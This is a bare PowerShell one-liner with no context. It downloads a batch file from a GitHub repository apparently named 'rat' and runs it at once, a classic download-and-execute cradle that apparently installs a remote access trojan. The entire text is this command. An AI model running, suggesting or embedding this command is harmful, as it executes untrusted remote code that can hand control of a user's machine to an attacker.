powershell -Command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubuserconte
nt.com/murmurlab/rat/main/x1.bat', 'x1.bat'); Start-Process -FilePath 'x1.bat' }"